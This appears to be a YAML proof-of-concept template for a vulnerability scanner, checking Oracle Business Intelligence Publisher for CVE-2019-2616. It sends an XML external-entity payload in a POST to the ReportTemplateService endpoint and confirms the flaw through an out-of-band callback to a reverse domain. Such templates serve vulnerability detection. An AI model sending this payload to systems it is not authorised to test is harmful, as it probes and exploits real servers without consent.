name: yaml-poc-oracle-business_intelligence_publisher-unauthorized_access-CVE-2019-2616
binding: ec01d065-d3e8-4f6f-b858-71690c08efe6
detail:
    author: jiapeng.han
    links:
        - http://www.nsfocus.net/vulndb/43125
        - http://www.oracle.com/index.html
        - http://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html
        - https://packetstormsecurity.com/files/152571/Oracle-Business-Intelligence-And-XML-Publisher-XML-Injection.html
        - https://www.exploit-db.com/exploits/46729
        - https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html
        - https://www.oracle.com/technetwork/security-advisory/cpuapr2019verbose-5072824.html
        - https://www.securityfocus.com/bid/107941
    vulnerability:
        id: 5099c8cf-b073-42d1-b8a3-fb60eded7f65
        level: high
    warning: Harmless
transport: http
set:
    reverse: newReverse()
    reverseDomain: reverse.domain
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /xmlpserver/ReportTemplateService.xls
            headers:
                Content-Type: text/xml
            body: |
                <!DOCTYPE soap:envelope PUBLIC "-//B/A/EN" "http://{{reverseDomain}}">
            follow_redirects: false
        expression: reverse.wait(5)
expression: r0()
